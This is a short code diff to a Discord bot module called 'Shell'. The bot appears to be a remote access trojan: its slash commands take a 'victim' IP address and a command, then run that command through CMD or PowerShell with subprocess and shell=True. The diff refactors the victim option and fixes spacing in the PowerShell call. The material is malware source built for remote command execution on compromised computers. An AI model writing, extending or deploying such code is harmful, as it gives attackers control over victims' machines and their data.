@@ -13,7 +13,7 @@ class Shell(commands.Cog):
     @commands.slash_command(
         description="Executes command prompt commands",
         options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
+            self.bot.victim,
             discord.Option("command", description="The CMD command which will be executed", required=True),
         ]
     )
@@ -52,7 +52,7 @@ class Shell(commands.Cog):
     @commands.slash_command(
         description="Executes Powershell commands",
         options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
+            self.bot.victim,
             discord.Option("command", description="The PS command which will be executed", required=True),
         ]
     )
@@ -61,7 +61,7 @@ class Shell(commands.Cog):
             await ctx.response.defer()
             
             output = subprocess.run(
-                "powershell.exe" + command, 
+                "powershell.exe " + command, 
                 shell=True,
                 stdin=subprocess.PIPE, 
                 stderr=subprocess.PIPE,
